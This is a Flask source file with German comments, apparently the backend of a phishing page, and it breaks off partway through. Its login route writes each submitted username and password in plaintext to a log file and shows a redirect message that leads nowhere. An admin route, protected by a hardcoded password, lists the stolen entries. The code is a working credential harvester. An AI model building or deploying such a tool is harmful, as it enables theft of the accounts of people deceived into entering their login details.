from flask import Flask, render_template, request
from datetime import datetime
import os

app = Flask(__name__)

LOG_FILE = "log.txt"
ADMIN_PASSWORD = "6067"  # Dein Admin-Passwort

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Username: {username} | Password: {password}\n")
        except Exception as e:
            return f"<h3>Fehler beim Speichern: {str(e)}</h3>"

        return "<h2>Danke. Du wirst weitergeleitet...</h2>"

    return render_template("index.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    # Wenn Datei nicht existiert, erstelle sie leer
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("")

    if request.method == "POST":
        entered_password = request.form.get("password")
        if entered_password != ADMIN_PASSWORD:
            return "<h3>❌ Falsches Passwort!</h3><a href='/admin'>Zurück</a>"

        try:
            with open(LOG_FILE, "r") as f:
                logs = f.readlines()

            if not logs:
                return "<h3>Keine Eingaben bisher.</h3>"

            content = "<br>".join(
                line.strip().replace("<", "&lt;").replace(">", "&gt;") for line in logs
            )
            return f"
